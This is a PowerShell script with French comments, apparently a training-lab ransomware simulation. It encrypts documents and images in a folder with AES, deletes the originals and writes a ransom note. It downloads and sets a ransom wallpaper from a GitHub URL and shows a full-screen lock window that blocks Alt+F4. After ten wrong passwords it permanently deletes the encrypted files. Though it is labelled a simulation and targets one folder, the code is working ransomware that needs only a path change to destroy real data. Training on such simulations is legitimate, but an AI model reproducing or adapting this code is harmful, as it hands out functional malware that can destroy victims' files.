
$password = "TP2026"
$folder = "C:\tp-simulation"

# --- VERIFICATION / CREATION DOSSIER ---
if (-not (Test-Path $folder)) {
    $folder = "C:\tp-simulation"
    New-Item -ItemType Directory -Path $folder | Out-Null
    "Contenu fichier texte" | Out-File "$folder\fichier_test.txt" -Encoding UTF8
    "Contenu fichier pdf simule" | Out-File "$folder\fichier_test.pdf" -Encoding UTF8
    "Contenu fichier excel simule" | Out-File "$folder\fichier_test.xlsx" -Encoding UTF8
}

$sha = New-Object System.Security.Cryptography.SHA256Managed
$key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))

# --- CHIFFREMENT ---
$files = Get-ChildItem $folder -File -Include "*.txt","*.docx","*.pdf","*.xlsx","*.jpg","*.png" -Recurse

foreach ($file in $files)
{
    $data = [System.IO.File]::ReadAllBytes($file.FullName)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.GenerateIV()
    $encryptor = $aes.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($data, 0, $data.Length)
    $result = $aes.IV + $encryptedData
    $outputFile = $file.FullName + ".locked"
    [System.IO.File]::WriteAllBytes($outputFile, $result)
    Remove-Item $file.FullName -Force
    Write-Host "Chiffre :" $file.Name
}

# --- NOTE DE RANSON ---
$ransom = @"
==========================================================
            VOS FICHIERS ONT ETE CHIFFRES
==========================================================

Tous vos fichiers ont ete chiffres avec AES-256.
Les fichiers originaux ont ete supprimes.

Pour recuperer vos fichiers, entrez le mot de passe.

----------------------------------------------------------
  CECI EST UNE SIMULATION - ENVIRONNEMENT DE FORMATION
----------------------------------------------------------
"@
$utf8Bom = New-Object System.Text.UTF8Encoding $true
[System.IO.File]::WriteAllText("$folder\README_DECRYPT.txt", $ransom, $utf8Bom)



# --- FOND D'ECRAN DEPUIS GITHUB ---
$wallpaperPath = "$env:TEMP\ransom_wallpaper.jpg"
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/asmaerouel/MesTest/refs/heads/main/ransomware.jpg", $wallpaperPath)

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll")]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 3)


Start-Sleep -Seconds 2


# --- FENETRE RANSOMWARE ---
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$script:tentatives = 10

$form = New-Object System.Windows.Forms.Form
$form.WindowState = "Maximized"
$form.FormBorderStyle = "None"
$form.BackColor = [System.Drawing.Color]::Black
$form.TopMost = $true
$form.KeyPreview = $true

$form.Add_KeyDown({
    if ($_.KeyCode -eq "F4" -and $_.Alt) { $_.SuppressKeyPress = $true }
    if ($_.KeyCode -eq "Escape") {
        if ($form.WindowState -eq "Maximized") {
            $form.WindowState = "Normal"
            $form.FormBorderStyle = "Sizable"
        } else {
            $form.WindowState = "Maximized"
            $form.FormBorderStyle = "None"
        }
    }
})

$labelTitle = New-Object System.Windows.Forms.Label
$labelTitle.Text = "ATTENTION!"
$labelTitle.ForeColor = [System.Drawing.Color]::Red
$labelTitle.Font = New-Object System.Drawing.Font("Consolas", 50, [System.Drawing.FontStyle]::Bold)
$labelTitle.AutoSize = $true
$labelTitle.Location = New-Object System.Drawing.Point(600, 150)

$labelSub = New-Object System.Windows.Forms.Label
$labelSub.Text = "VOS FICHIERS ONT ETE CHIFFRES"
$labelSub.ForeColor = [System.Drawing.Color]::White
$labelSub.Font = New-Object System.Drawing.Font("Consolas", 28, [System.Drawing.FontStyle]::Bold)
$labelSub.AutoSize = $true
$labelSub.Location = New-Object System.Drawing.Point(380, 280)

$labelInfo = New-Object System.Windows.Forms.Label
$labelInfo.Text = "Entrez le mot de passe pour recuperer vos fichiers"
$labelInfo.ForeColor = [System.Drawing.Color]::White
$labelInfo.Font = New-Object System.Drawing.Font("Consolas", 18)
$labelInfo.AutoSize = $true
$labelInfo.Location = New-Object System.Drawing.Point(380, 400)

$labelTentatives = New-Object System.Windows.Forms.Label
$labelTentatives.Text = "Il vous reste $($script:tentatives) tentative(s)"
$labelTentatives.ForeColor = [System.Drawing.Color]::Yellow
$labelTentatives.Font = New-Object System.Drawing.Font("Consolas", 16)
$labelTentatives.AutoSize = $true
$labelTentatives.Location = New-Object System.Drawing.Point(380, 460)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(380, 520)
$textBox.Size = New-Object System.Drawing.Size(400, 40)
$textBox.Font = New-Object System.Drawing.Font("Consolas", 20)
$textBox.PasswordChar = "*"
$textBox.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$textBox.ForeColor = [System.Drawing.Color]::White

$labelError = New-Object System.Windows.Forms.Label
$labelError.Text = ""
$labelError.ForeColor = [System.Drawing.Color]::Red
$labelError.Font = New-Object System.Drawing.Font("Consolas", 14)
$labelError.AutoSize = $true
$labelError.Location = New-Object System.Drawing.Point(380, 580)

$button = New-Object System.Windows.Forms.Button
$button.Text = "DECHIFFRER"
$button.Location = New-Object System.Drawing.Point(800, 515)
$button.Size = New-Object System.Drawing.Size(160, 45)
$button.BackColor = [System.Drawing.Color]::DarkRed
$button.ForeColor = [System.Drawing.Color]::White
$button.Font = New-Object System.Drawing.Font("Consolas", 13, [System.Drawing.FontStyle]::Bold)
$button.FlatStyle = "Flat"

$button.Add_Click({
    if ([string]::IsNullOrEmpty($textBox.Text)) {
        $labelError.Text = "Veuillez entrer un mot de passe"
        return
    }
    if ($textBox.Text -eq $password) {
        $form.Close()
    } else {
        $script:tentatives--
        $labelTentatives.Text = "Il vous reste $($script:tentatives) tentative(s)"
        if ($script:tentatives -le 0) {
            $labelError.Text = "Toutes les tentatives epuisees. Vos donnees sont perdues."
            $button.Enabled = $false
            $textBox.Enabled = $false
        } else {
            $labelError.Text = "Mot de passe incorrect !"
            $textBox.Clear()
        }
    }
})

$form.Controls.Add($labelTitle)
$form.Controls.Add($labelSub)
$form.Controls.Add($labelInfo)
$form.Controls.Add($labelTentatives)
$form.Controls.Add($textBox)
$form.Controls.Add($labelError)
$form.Controls.Add($button)
$form.ShowDialog()

# --- DECHIFFREMENT si bon mot de passe ---
if ($script:tentatives -gt 0) {

 $blackWallpaper = "$env:TEMP\black.bmp"
    Add-Type -AssemblyName System.Drawing
    $bitmap = New-Object System.Drawing.Bitmap(1920, 1080)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.Clear([System.Drawing.Color]::Black)
    $bitmap.Save($blackWallpaper)
    $graphics.Dispose()
    $bitmap.Dispose()
    [Wallpaper]::SystemParametersInfo(20, 0, $blackWallpaper, 3)



    $encryptedFiles = Get-ChildItem $folder -File -Filter "*.locked" -Recurse

    foreach ($encFile in $encryptedFiles)
    {
        $data = [System.IO.File]::ReadAllBytes($encFile.FullName)
        $iv = $data[0..15]
        $encryptedData = $data[16..($data.Length - 1)]
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Key = $key
        $aes.IV = $iv
        $decryptor = $aes.CreateDecryptor()
        $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
        $originalName = $encFile.FullName -replace '\.locked$', ''
        [System.IO.File]::WriteAllBytes($originalName, $decryptedData)
        Remove-Item $encFile.FullName -Force
        Write-Host "Dechiffre :" $originalName
    }

    # Nettoyage
    Remove-Item "$folder\README_DECRYPT.txt" -Force -ErrorAction SilentlyContinue
    Write-Host ""
    Write-Host "Tous les fichiers ont ete dechiffres et restaures." -ForegroundColor Green

} else {

    # Supprimer les fichiers si tentatives epuisees
    $encryptedFiles = Get-ChildItem $folder -File -Filter "*.locked" -Recurse
    foreach ($encFile in $encryptedFiles) {
        Remove-Item $encFile.FullName -Force
    }
    Remove-Item "$folder\README_DECRYPT.txt" -Force -ErrorAction SilentlyContinue
    Write-Host "Vos donnees sont perdues definitivement." -ForegroundColor Red
}